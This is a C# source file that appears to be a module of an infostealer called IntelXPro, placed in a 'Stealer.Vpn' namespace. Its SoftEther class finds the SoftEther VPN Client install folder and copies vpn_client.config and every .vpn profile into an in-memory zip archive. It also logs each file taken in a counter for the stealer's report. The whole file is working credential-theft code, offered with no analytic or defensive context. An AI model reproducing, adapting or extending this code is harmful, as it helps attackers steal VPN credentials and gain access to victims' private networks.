using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Vpn
{
    internal class SoftEther : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "SoftEther VPN Client");
            if (!Directory.Exists(text))
            {
                return;
            }
            string path = "SoftEther";
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "SoftEther VPN";
            string text2 = Path.Combine(text, "vpn_client.config");
            if (File.Exists(text2))
            {
                try
                {
                    string text3 = Path.Combine("Vpn", path, "vpn_client.config");
                    zip.AddFile(text3, File.ReadAllBytes(text2));
                    counterApplications.Files.Add(text2 + " => " + text3);
                }
                catch
                {
                }
            }
            string[] files = Directory.GetFiles(text, "*.vpn", SearchOption.TopDirectoryOnly);
            foreach (string text4 in files)
            {
                try
                {
                    string fileName = Path.GetFileName(text4);
                    string text5 = Path.Combine("Vpn", path, fileName);
                    zip.AddFile(text5, File.ReadAllBytes(text4));
                    counterApplications.Files.Add(text4 + " => " + text5);
                }
                catch
                {
                }
            }
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add(Path.Combine("Vpn", path));
                counter.Vpns.Add(counterApplications);
            }
        }
    }

}
